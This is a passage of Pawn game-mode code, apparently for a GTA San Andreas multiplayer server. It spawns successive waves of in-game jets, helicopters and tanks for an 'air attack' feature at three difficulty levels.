AirAttackV[playerid][39] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]-20.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 11;
return true;
}

else if(AsLevel[playerid] == 2)
{
AirAttackV[playerid][54] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]-20.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][55] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-20.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][56] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]-20.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][57] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]-20.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][58] =  CreateVehicle(520, AirAttack[playerid][0]+40.0,AirAttack[playerid][1]-20.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][59] =  CreateVehicle(520, AirAttack[playerid][0]+50.0,AirAttack[playerid][1]-20.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 11;
return true;
}

else if(AsLevel[playerid] == 3)
{
AirAttackV[playerid][107] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]-20.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][108] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-20.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][109] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]-20.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][110] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]-20.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][111] =  CreateVehicle(520, AirAttack[playerid][0]+40.0,AirAttack[playerid][1]-20.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][112] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-20.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][113] =  CreateVehicle(520, AirAttack[playerid][0]+50.0,AirAttack[playerid][1]-20.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][114] =  CreateVehicle(425, AirAttack[playerid][0]+60.0,AirAttack[playerid][1]-20.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][115] =  CreateVehicle(432, AirAttack[playerid][0],AirAttack[playerid][1]-20.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][116] =  CreateVehicle(432, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-20.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][117] =  CreateVehicle(432, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]-20.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][118] =  CreateVehicle(432, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]-20.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 11;
LaunchZone4(playerid);
return true;
}


return true;
}
else if(Stateaa[playerid] == 11)
{

if(AsLevel[playerid] == 1)
{
AirAttackV[playerid][40] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1],AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][41] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1],AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][42] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1],AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][43] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1],AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 12;
return true;
}

else if(AsLevel[playerid] == 2)
{
AirAttackV[playerid][60] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1],AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][61] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1],AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][62] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1],AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][63] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1],AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][64] =  CreateVehicle(520, AirAttack[playerid][0]+40.0,AirAttack[playerid][1],AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][65] =  CreateVehicle(520, AirAttack[playerid][0]+50.0,AirAttack[playerid][1],AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 12;
return true;
}

else if(AsLevel[playerid] == 3)
{
AirAttackV[playerid][119] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1],AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][120] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1],AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][121] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1],AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][122] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1],AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][123] =  CreateVehicle(520, AirAttack[playerid][0]+40.0,AirAttack[playerid][1],AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][124] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1],AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][125] =  CreateVehicle(520, AirAttack[playerid][0]+50.0,AirAttack[playerid][1],AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][126] =  CreateVehicle(425, AirAttack[playerid][0]+60.0,AirAttack[playerid][1],AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][127] =  CreateVehicle(432, AirAttack[playerid][0],AirAttack[playerid][1],AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][128] =  CreateVehicle(432, AirAttack[playerid][0]+10.0,AirAttack[playerid][1],AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][129] =  CreateVehicle(432, AirAttack[playerid][0]+20.0,AirAttack[playerid][1],AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][130] =  CreateVehicle(432, AirAttack[playerid][0]+30.0,AirAttack[playerid][1],AirAttack[playerid][2], 0.0, 0, 6, -1000);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 12;
return true;
}

return true;
}

else if(Stateaa[playerid] == 12)
{

if(AsLevel[playerid] == 1)
{
AirAttackV[playerid][44] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]+40.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][45] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]+40.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][46] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]+40.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][47] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]+40.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 13;
return true;
}

else if(AsLevel[playerid] == 2)
{
AirAttackV[playerid][66] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]+40.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][67] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]+40.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][68] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]+40.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][69] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]+40.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][70] =  CreateVehicle(520, AirAttack[playerid][0]+40.0,AirAttack[playerid][1]+40.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][71] =  CreateVehicle(520, AirAttack[playerid][0]+50.0,AirAttack[playerid][1]+40.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 13;
return true;
}

else if(AsLevel[playerid] == 3)
{
AirAttackV[playerid][131] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]+40.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][132] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]+40.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][133] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]+40.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][134] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]+40.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][135] =  CreateVehicle(520, AirAttack[playerid][0]+40.0,AirAttack[playerid][1]+40.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][136] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]+40.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][137] =  CreateVehicle(520, AirAttack[playerid][0]+50.0,AirAttack[playerid][1]+40.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][138] =  CreateVehicle(425, AirAttack[playerid][0]+60.0,AirAttack[playerid][1]+40.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][139] =  CreateVehicle(432, AirAttack[playerid][0],AirAttack[playerid][1]+40.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][140] =  CreateVehicle(432, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]+40.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][141] =  CreateVehicle(432, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]+40.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][142] =  CreateVehicle(432, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]+40.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 13;
return true;
}

return true;
}

else if(Stateaa[playerid] == 13)
{

if(AsLevel[playerid] == 1)
{
AirAttackV[playerid][48] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]+80.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][49] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]+80.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][50] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]+80.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][51] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]+80.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 14;
return true;
}

else if(AsLevel[playerid] == 2)
{
AirAttackV[playerid][72] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]+80.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][73] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]+80.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][74] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]+80.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][75] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]+80.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][76] =  CreateVehicle(520, AirAttack[playerid][0]+40.0,AirAttack[playerid][1]+80.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][77] =  CreateVehicle(520, AirAttack[playerid][0]+50.0,AirAttack[playerid][1]+80.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 14;

return true;
}

else if(AsLevel[playerid] == 3)
{
AirAttackV[playerid][143] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]+80.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][144] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]+80.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][145] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]+80.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][146] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]+80.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][147] =  CreateVehicle(520, AirAttack[playerid][0]+40.0,AirAttack[playerid][1]+80.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][148] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]+80.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][149] =  CreateVehicle(520, AirAttack[playerid][0]+50.0,AirAttack[playerid][1]+80.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][150] =  CreateVehicle(425, AirAttack[playerid][0]+60.0,AirAttack[playerid][1]+80.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][151] =  CreateVehicle(432, AirAttack[playerid][0],AirAttack[playerid][1]+80.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][152] =  CreateVehicle(432, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]+80.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][153] =  CreateVehicle(432, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]+80.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][154] =  CreateVehicle(432, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]+80.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 14;
return true;
}

return true;
}

else if(Stateaa[playerid] == 14)
{
if(AsLevel[playerid] == 1)
{
AirAttackV[playerid][52] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]+100.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][53] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]+100.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][54] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]+100.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][55] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]+100.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 15;
return true;
}


else if(AsLevel[playerid] == 2)
{
AirAttackV[playerid][78] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]+100.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][79] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]+100.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][80] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]+100.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][81] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]+100.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][82] =  CreateVehicle(520, AirAttack[playerid][0]+40.0,AirAttack[playerid][1]+100.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][83] =  CreateVehicle(520, AirAttack[playerid][0]+50.0,AirAttack[playerid][1]+100.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 15;
return true;
}

else if(AsLevel[playerid] == 3)
{
AirAttackV[playerid][155] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]+100.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][156] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]+100.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][157] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]+100.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][158] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]+100.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][159] =  CreateVehicle(520, AirAttack[playerid][0]+40.0,AirAttack[playerid][1]+100.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][160] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]+100.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][161] =  CreateVehicle(520, AirAttack[playerid][0]+50.0,AirAttack[playerid][1]+100.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][162] =  CreateVehicle(425, AirAttack[playerid][0]+60.0,AirAttack[playerid][1]+100.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][163] =  CreateVehicle(432, AirAttack[playerid][0],AirAttack[playerid][1]+100.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][164] =  CreateVehicle(432, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]+100.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][165] =  CreateVehicle(432, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]+100.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][166] =  CreateVehicle(432, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]+100.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 15;
return true;
}

return true;
}


else if(Stateaa[playerid] == 15)
{

if(AsLevel[playerid] == 1)
{
AirAttackV[playerid][56] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]+120.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][57] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]+120.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][58] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]+120.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][59] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]+120.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 16;
return true;
}

else if(AsLevel[playerid] == 2)
{
AirAttackV[playerid][84] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]+120.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][85] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]+120.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][86] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]+120.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][87] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]+120.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][88] =  CreateVehicle(520, AirAttack[playerid][0]+40.0,AirAttack[playerid][1]+120.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][89] =  CreateVehicle(520, AirAttack[playerid][0]+50.0,AirAttack[playerid][1]+120.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 16;
return true;
}

else if(AsLevel[playerid] == 3)
{
AirAttackV[playerid][167] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]+120.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][168] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]+120.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][169] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]+120.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][170] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]+120.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][171] =  CreateVehicle(520, AirAttack[playerid][0]+40.0,AirAttack[playerid][1]+120.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][172] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]+120.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][173] =  CreateVehicle(520, AirAttack[playerid][0]+50.0,AirAttack[playerid][1]+120.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][174] =  CreateVehicle(425, AirAttack[playerid][0]+60.0,AirAttack[playerid][1]+120.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][175] =  CreateVehicle(432, AirAttack[playerid][0],AirAttack[playerid][1]+120.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][176] =  CreateVehicle(432, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]+120.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][177] =  CreateVehicle(432, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]+120.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][178] =  CreateVehicle(432, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]+120.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 16;
return true;
}

return true;
}

else if(Stateaa[playerid] == 16)
{

if(AsLevel[playerid] == 1)
{
AirAttackV[playerid][60] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]+140.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][61] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]+140.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][62] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]+140.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][63] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]+140.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 17;

return true;
}

else if(AsLevel[playerid] == 2)
{
AirAttackV[playerid][90] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]+140.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][91] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]+140.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][92] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]+140.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][93] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]+140.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][94] =  CreateVehicle(520, AirAttack[playerid][0]+40.0,AirAttack[playerid][1]+140.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][95] =  CreateVehicle(520, AirAttack[playerid][0]+50.0,AirAttack[playerid][1]+140.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 17;
return true;
}

else if(AsLevel[playerid] == 3)
{
AirAttackV[playerid][179] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]+140.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][180] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]+140.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][181] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]+140.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][182] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]+140.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][183] =  CreateVehicle(520, AirAttack[playerid][0]+40.0,AirAttack[playerid][1]+140.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][184] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]+140.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][185] =  CreateVehicle(520, AirAttack[playerid][0]+50.0,AirAttack[playerid][1]+140.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][186] =  CreateVehicle(425, AirAttack[playerid][0]+60.0,AirAttack[playerid][1]+140.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][187] =  CreateVehicle(432, AirAttack[playerid][0],AirAttack[playerid][1]+140.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][188] =  CreateVehicle(432, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]+140.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
